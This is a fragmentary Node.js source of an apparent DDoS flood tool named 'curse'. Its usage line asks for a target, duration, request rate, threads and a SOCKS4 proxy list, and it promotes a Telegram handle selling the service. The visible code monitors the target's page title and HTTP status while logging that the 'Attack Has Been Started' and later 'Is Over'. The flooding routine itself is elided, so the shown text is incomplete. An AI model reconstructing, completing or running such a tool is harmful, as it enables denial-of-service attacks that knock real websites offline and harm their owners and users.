...
if (process.argv.length < 7){console.log(`\x1b[38;5;160mnode curse target time rate(\x1b[38;5;255m32\x1b[38;5;160m) thread socks4.txt \x1b[38;5;255m| \x1b[38;5;160mtelegram: \x1b[38;5;255m@DichVuRight`); process.exit();}
const headers = {};
...
const getCurrentTime = () => {
 ...
 Promise.race([axiosPromise, timeoutPromise])
   .then((response) => {
     ...
     console.clear()
     console.log(`\x1b[38;5;255m[\x1b[38;5;160mDichVuRight ✅\x1b[38;5;255m] ${getCurrentTime()} Title: \x1b[38;5;160m${getTitleFromHTML(data)} \x1b[38;5;255m(\x1b[32m${status}\x1b[38;5;255m)`);
   })
   .catch((error) => {
     if (error.message === 'Request timed out') {
       console.log(`\x1b[38;5;255m[\x1b[38;5;160mDichVuRight ✅\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;160mRequest Timed Out`);
     } else if (error.response) {
       const extractedTitle = getTitleFromHTML(error.response.data);
       console.log(`\x1b[38;5;255m[\x1b[38;5;160mDichVuRight ✅\x1b[38;5;255m] ${getCurrentTime()} Title: \x1b[38;5;160m${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
     } else {
       console.log(`\x1b[38;5;255m[\x1b[38;5;160mDichVuRight ✅\x1b[38;5;255m] ${getCurrentTime()} ${error.message}`);
     }
   });
}
...
`);
 ...
 console.log(`\x1b[38;5;255m[\x1b[38;5;160mDichVuRight ✅\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;255mAttack\x1b[38;5;160m Has Been Started`);
 setInterval(getStatus, 2000);
 setTimeout(() => {
   console.log(`\x1b[38;5;255m[\x1b[38;5;160mDichVuRight ✅\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;160mThe \x1b[38;5;255mAttack\x1b[38;5;160m Is Over`);
   process.exit(1);
 }, process.argv[3] * 1000);
} 
